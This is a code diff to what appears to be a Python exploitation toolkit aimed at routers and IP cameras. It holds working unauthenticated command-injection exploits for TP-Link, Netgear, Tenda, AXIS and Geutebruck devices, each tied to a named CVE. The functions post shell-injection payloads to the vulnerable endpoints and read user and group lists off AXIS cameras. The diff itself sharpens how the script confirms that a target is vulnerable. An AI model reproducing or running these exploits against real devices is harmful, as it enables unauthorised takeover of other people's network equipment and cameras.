@@ -1314,16 +1314,22 @@ def cve_tplink_rce(ip, port=80):
     """
     CVE-2023-1389 — TP-Link Archer AX21 unauthenticated command injection
     via /cgi-bin/luci/;stok=/locale endpoint.
+    Vulnerable response: JSON with {"success":true} or {"error_code":0}.
+    Non-vulnerable: HTML page, 404, 403.
     """
     print(f"[*] CVE-2023-1389 TP-Link RCE: {ip}:{port}")
     url = f"http://{ip}:{port}/cgi-bin/luci/;stok=/locale"
     data = "form=country&operation=write&country=$(id>%2Ftmp%2Ftp_rce.txt)"
     code, resp = _http_post(url, data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
-    if code in (200, 204) or "country" in resp.lower():
+    r = resp.strip()
+    # Vulnerable TP-Link LuCI endpoint returns compact JSON, not an HTML page
+    is_json = r.startswith("{") or r.startswith("[")
+    is_html = "<html" in r.lower() or "<!doctype" in r.lower()
+    if code in (200, 204) and is_json and not is_html:
         print(f"[+] TP-Link injection sent — check /tmp/tp_rce.txt on device")
         return True
-    print(f"[-] TP-Link CVE-2023-1389: HTTP {code}")
+    print(f"[-] TP-Link CVE-2023-1389: HTTP {code} (not a TP-Link LuCI response)")
     return False
 
 
@@ -1331,32 +1337,40 @@ def cve_netgear_rce(ip, port=80):
     """
     CVE-2021-40847 — Netgear Circle parental control unauthenticated RCE.
     Affects Netgear RAX series routers with Circle parental controls enabled.
+    Vulnerable: endpoint exists (not 404) and returns non-HTML content.
     """
     print(f"[*] CVE-2021-40847 Netgear Circle RCE: {ip}:{port}")
-    # Circle update mechanism calls a script that passes user-controlled data
-    # to system() without sanitization
     url = f"http://{ip}:{port}/circle_update.php"
     inject = "$(id>/tmp/netgear_rce.txt)"
     data = f"update_url=http://evil.invalid/{inject}"
     code, resp = _http_post(url, data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"})
+    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
     print(f"    HTTP {code}: {resp[:100]}")
-    return code != 0
+    # Netgear's circle_update.php returns a short non-HTML response; 404 = not present
+    if code in (200, 204) and not is_html:
+        print(f"[+] Netgear Circle endpoint found — injection sent")
+        return True
+    print(f"[-] Netgear CVE-2021-40847: endpoint not present (HTTP {code})")
+    return False
 
 
 def cve_tenda_rce(ip, port=80):
     """
     CVE-2020-10987 — Tenda AC routers command injection via goform/setUsbUnload.
     Unauthenticated RCE.
+    Vulnerable: goform endpoint returns short JSON/text, not a full HTML page.
     """
     print(f"[*] CVE-2020-10987 Tenda RCE: {ip}:{port}")
     url = f"http://{ip}:{port}/goform/setUsbUnload"
     inject = "$(id>/tmp/tenda_pwned.txt)"
     data = f"deviceName={inject}"
     code, resp = _http_post(url, data)
-    if code == 200:
+    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
+    if code == 200 and not is_html:
         print(f"[+] Tenda injection sent")
         return True
+    print(f"[-] Tenda CVE-2020-10987: endpoint not present (HTTP {code})")
     return False
 
 
@@ -1364,17 +1378,20 @@ def cve_axis_rce(ip, port=80):
     """
     CVE-2018-10660 — AXIS Communications camera shell command injection.
     Via /bin/handler, affects multiple AXIS camera models.
+    Vulnerable info-leak response: key=value lines (e.g. 'users=admin ...').
+    Non-vulnerable: HTML page (device returned its own home page).
     """
     print(f"[*] CVE-2018-10660 AXIS camera RCE: {ip}:{port}")
-    # AXIS uses SSH-keygen for certificate generation — the hostname is passed
-    # unsanitized to a system() call
     payloads = [
         f"http://{ip}:{port}/axis-cgi/admin/pwdgrp.cgi?action=get",
         f"http://{ip}:{port}/axis-cgi/usergroup.cgi?action=list",
     ]
     for url in payloads:
         code, resp = _http_get(url)
-        if code == 200:
+        is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
+        # AXIS CGI responses are key=value text, not HTML
+        axis_markers = any(kw in resp for kw in ["users=", "groups=", "admin", "operator", "viewer"])
+        if code == 200 and not is_html and axis_markers:
             print(f"[+] AXIS info leak: {url}")
             print(f"    {resp[:300]}")
             return True
@@ -1382,7 +1399,7 @@ def cve_axis_rce(ip, port=80):
     inject_url = (f"http://{ip}:{port}/axis-cgi/admin/param.cgi"
                   f"?action=update&root.brand.ProdNbr=$(id>/tmp/axis.txt)")
     code, resp = _http_get(inject_url)
-    print(f"    HTTP {code}")
+    print(f"[-] AXIS CVE-2018-10660: no AXIS CGI endpoints found (HTTP {code})")
     return False
 
 
@@ -1390,15 +1407,18 @@ def cve_geutebruck_rce(ip, port=80):
     """
     CVE-2021-33544 — Geutebruck G-CAM/EFD-2 IP cameras command injection.
     Unauthenticated RCE via /uapi-cgi/viewer/testaction.cgi.
+    Vulnerable response: short non-HTML reply from the CGI endpoint.
     """
     print(f"[*] CVE-2021-33544 Geutebruck RCE: {ip}:{port}")
     url = f"http://{ip}:{port}/uapi-cgi/viewer/testaction.cgi"
     inject = "id>/tmp/g_pwned.txt"
     data = f"cmd={inject}"
     code, resp = _http_post(url, data)
-    if code == 200:
+    is_html = "<html" in resp.lower() or "<!doctype" in resp.lower()
+    if code == 200 and not is_html:
         print(f"[+] Geutebruck injection sent — result: {resp[:100]}")
         return True
+    print(f"[-] Geutebruck CVE-2021-33544: endpoint not present (HTTP {code})")
     return False
 
 
